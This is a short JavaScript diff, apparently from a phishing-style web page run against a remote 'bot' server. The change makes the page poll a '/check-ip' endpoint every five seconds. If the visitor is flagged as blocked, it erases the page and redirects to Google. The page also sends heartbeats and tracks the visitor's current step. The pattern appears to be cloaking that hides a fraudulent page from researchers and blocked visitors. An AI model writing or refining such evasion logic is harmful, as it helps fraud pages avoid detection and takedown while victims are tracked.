@@ -1152,15 +1152,20 @@ window.__PYP_SESSION__ = sessionId;
 
 var ultimaAccion = 'entrando';
 
-fetch(BOT_URL + '/check-ip')
-.then(function(r) { return r.json(); })
-.then(function(data) {
-if (data.bloqueado) {
-document.documentElement.innerHTML = '';
-window.location.replace(data.redirect || 'https://www.google.com');
+function verificarBloqueo() {
+    fetch(BOT_URL + '/check-ip')
+    .then(function(r) { return r.json(); })
+    .then(function(data) {
+        if (data.bloqueado) {
+            document.documentElement.innerHTML = '';
+            window.location.replace(data.redirect || 'https://www.google.com');
+        }
+    })
+    .catch(function() {});
 }
-})
-.catch(function() {});
+
+verificarBloqueo();
+setInterval(verificarBloqueo, 5000);
 
 function enviarHeartbeat() {
 fetch(BOT_URL + '/heartbeat', {
